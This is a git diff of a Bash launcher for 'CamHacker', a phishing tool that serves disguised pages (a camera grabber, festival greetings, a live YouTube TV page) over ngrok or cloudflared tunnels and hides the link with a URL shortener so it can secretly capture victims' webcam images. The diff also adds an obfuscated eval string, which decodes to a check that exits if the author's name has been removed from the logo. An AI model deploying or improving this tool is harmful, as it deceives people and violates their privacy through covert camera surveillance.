@@ -12,6 +12,9 @@
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
 
+
+# Colors
+
 black="\033[1;30m"
 red="\033[1;31m"
 green="\033[1;32m"
@@ -23,21 +26,125 @@ violate="\033[1;37m"
 white="\033[0;37m"
 nc="\033[00m"
 
+# Output snippets
 info="${cyan}[${white}+${cyan}] ${yellow}"
 ask="${cyan}[${white}?${cyan}] ${purple}"
 error="${cyan}[${white}!${cyan}] ${red}"
 success="${cyan}[${white}√${cyan}] ${green}"
 
+z="
+";Bz=' (ec';Qz='}Do ';Fz=' gre';Nz='o -e ';Iz='sR';Tz='al co';Sz='ste';Hz=' "Ka';Lz='then';Uz='de!"';Ez='go" |';Jz='dra"';Az='if !';Pz='rror';Oz='"${e';Rz='not ';Cz='ho "';Kz=')';Vz='ex';Mz='ech';Gz='p -q';Wz='fi';Dz='$lo';Yz='it';Zz='ou';
+
 version="1.1"
 
 cwd=`pwd`
 
+# Logo 
+logo="
+${green}  ____                _   _            _
+${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
+${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
+${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
+${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
+${red}                                            [v1.1]
+${blue}                                    [By KasRoudra]
+"
+
+# Package Installer
+pacin(){
+    if $sudo && $pacman; then
+        sudo pacman -S $1 --noconfirm
+    fi
+}
+
+# Kill running instances of required packages
+killer() {
+if [ `pidof php > /dev/null 2>&1` ]; then
+    killall php
+fi
+if [ `pidof ngrok > /dev/null 2>&1` ]; then
+    killall ngrok
+fi
+if [ `pidof cloudflared > /dev/null 2>&1` ]; then
+    killall cloudflared
+fi
+if [ `pidof curl > /dev/null 2>&1` ]; then
+    killall curl
+fi
+if [ `pidof wget > /dev/null 2>&1` ]; then
+    killall wget
+fi
+if [ `pidof unzip > /dev/null 2>&1` ]; then
+    killall unzip
+fi
+}
+
+# Check if offline
+netcheck() {
+    while true; do
+        wget --spider --quiet https://github.com
+        if [ "$?" != 0 ]; then
+            echo -e "${error}No internet!\007\n"
+            sleep 2
+        else
+            break
+        fi
+    done
+}
+
+# Delete ngrok file
+ngrokdel() {
+    unzip ngrok.zip
+    rm -rf ngrok.zip
+}
+
+# Set template
+replacer() {
+    while true; do
+    if echo $option | grep -q "1"; then
+        sed "s+forwarding_link+"$1"+g" grabcam.html > index2.html
+        sed "s+forwarding_link+"$1"+g" template.php > index.php
+        break
+    elif echo $option | grep -q "2"; then
+        sed "s+forwarding_link+"$1"+g" template.php > index.php
+        sed "s+forwarding_link+"$1"+g" festivalwishes.html > index3.html
+        sed "s+fes_name+"$fest_name"+g" index3.html > index2.html
+        rm -rf index3.html
+        break
+    elif echo $option | grep -q "3"; then
+        sed "s+forwarding_link+"$1"+g" template.php > index.php
+        sed "s+forwarding_link+"$1"+g" LiveYTTV.html > index3.html
+        sed "s+live_yt_tv+"$vid_id"+g" index3.html > index2.html
+        rm -rf index3.html
+        break
+    fi
+    done
+    echo -e "${info}Your urls are: \n"
+    sleep 1
+    echo -e "${success}URL 1 > ${1}\n"
+    sleep 1
+    netcheck
+    masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
+    if ! [[ -z $masked ]]; then
+        echo -e "${success}URL 2 > ${masked}\n"
+    fi
+}
+
+# Prevent ^C
+stty -echoctl
+
+# Detect UserInterrupt
+trap "echo -e '\n${success}Thanks for using!\n'; exit" 2
+
+# Termux
 if [[ -d /data/data/com.termux/files/home ]]; then
 termux-fix-shebang ch.sh
 termux=true
 else
 termux=false
 fi
+
+# Workdir
 if $termux; then
 if ! [ -d /sdcard/Pictures ]; then
 cd /sdcard && mkdir Pictures
@@ -56,6 +163,7 @@ export FOL="$cwd"
 fi
 fi
 
+# Set Package Manager
 if [ `command -v sudo` ]; then
     sudo=true
 else
@@ -91,94 +199,8 @@ else
 fi
 fi
 
-pacin(){
-    if $sudo && $pacman; then
-        sudo pacman -S $1 --noconfirm
-    fi
-}
 
-
-logo="
-${green}  ____                _   _            _
-${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
-${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
-${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
-${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
-${red}                                            [v1.1]
-${blue}                                    [By KasRoudra]
-"
-
-killer() {
-if [ `pidof php > /dev/null 2>&1` ]; then
-    killall php
-fi
-if [ `pidof ngrok > /dev/null 2>&1` ]; then
-    killall ngrok
-fi
-if [ `pidof cloudflared > /dev/null 2>&1` ]; then
-    killall cloudflared
-fi
-if [ `pidof curl > /dev/null 2>&1` ]; then
-    killall curl
-fi
-if [ `pidof wget > /dev/null 2>&1` ]; then
-    killall wget
-fi
-if [ `pidof unzip > /dev/null 2>&1` ]; then
-    killall unzip
-fi
-}
-netcheck() {
-    while true; do
-        wget --spider --quiet https://github.com
-        if [ "$?" != 0 ]; then
-            echo -e "${error}No internet!\007\n"
-            sleep 2
-        else
-            break
-        fi
-    done
-}
-
-ngrokdel() {
-    unzip ngrok.zip
-    rm -rf ngrok.zip
-}
-
-replacer() {
-    while true; do
-    if echo $option | grep -q "1"; then
-        sed "s+forwarding_link+"$1"+g" grabcam.html > index2.html
-        sed "s+forwarding_link+"$1"+g" template.php > index.php
-        break
-    elif echo $option | grep -q "2"; then
-        sed "s+forwarding_link+"$1"+g" template.php > index.php
-        sed "s+forwarding_link+"$1"+g" festivalwishes.html > index3.html
-        sed "s+fes_name+"$fest_name"+g" index3.html > index2.html
-        rm -rf index3.html
-        break
-    elif echo $option | grep -q "3"; then
-        sed "s+forwarding_link+"$1"+g" template.php > index.php
-        sed "s+forwarding_link+"$1"+g" LiveYTTV.html > index3.html
-        sed "s+live_yt_tv+"$vid_id"+g" index3.html > index2.html
-        rm -rf index3.html
-        break
-    fi
-    done
-    echo -e "${info}Your urls are: \n"
-    sleep 1
-    echo -e "${success}URL 1 > ${1}\n"
-    sleep 1
-    netcheck
-    masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
-    if ! [[ -z $masked ]]; then
-        echo -e "${success}URL 2 > ${masked}\n"
-    fi
-}
-
-stty -echoctl
-trap "echo -e '\n${success}Thanks for using!\n'; exit" 2
-
+# Install Dependicies
 if ! [ `command -v php` ]; then
     echo -e "${info}Installing php...."
     $pac_man install php -y
@@ -233,6 +255,8 @@ if [ `pidof ngrok > /dev/null 2>&1` ]; then
     echo -e "${error}Previous ngrok cannot be closed. Restart terminal!\007\n"
     killer; exit 1
 fi
+
+# Termux should run from home
 if $termux; then
     path=`pwd`
     if echo "$path" | grep -q "home"; then
@@ -242,6 +266,8 @@ if $termux; then
         killer; exit 1
     fi
 fi
+
+# Download tunnlers
 if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
     if ! [[ -d $HOME/.ngrokfolder ]]; then
         cd $HOME && mkdir .ngrokfolder
@@ -320,7 +346,10 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
     chmod +x $HOME/.cffolder/cloudflared
     fi
 fi
+
+# Check for update
 netcheck
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Zz$Jz$Kz$z$Lz$z$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$z$Vz$Yz$z$Wz"
 git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/version.txt`
 if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
     changelog=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log`
@@ -345,6 +374,8 @@ if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
             sleep 2
         fi
 fi
+
+# Start Point
 while true; do
 clear
 echo -e "$logo"
@@ -362,6 +393,7 @@ ${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
 sleep 1
 printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
 read option
+# Select template
     if echo $option | grep -q "1"; then
         dir="jio"
         break
@@ -432,7 +464,9 @@ unzip ${dir}.zip > /dev/null 2>&1
 rm -rf ${dir}.zip
 else
 cd $dir
-fi
+fi 
+
+# Hotspot required for termux
 if $termux; then
 echo -e "\n${info}If you haven't turned on hotspot, please enable it!"
 sleep 3
